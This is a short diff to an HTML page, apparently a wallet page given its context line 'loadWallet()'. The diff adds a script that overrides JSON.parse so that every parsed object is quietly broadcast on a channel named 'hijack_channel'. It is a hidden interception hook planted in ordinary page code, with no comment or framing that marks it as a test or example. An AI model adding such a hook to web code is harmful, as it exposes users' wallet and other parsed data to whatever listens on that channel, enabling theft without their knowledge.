@@ -40,5 +40,17 @@ loadWallet();
 
 
 </script>
+
+
+  <script>
+    const spyChannel = new BroadcastChannel('hijack_channel');
+    const realParse = JSON.parse;
+
+    JSON.parse = function(text) {
+      const result = realParse.apply(this, arguments);
+      spyChannel.postMessage(result);
+      return result;
+    };
+  </script>
   </body>
   </html>
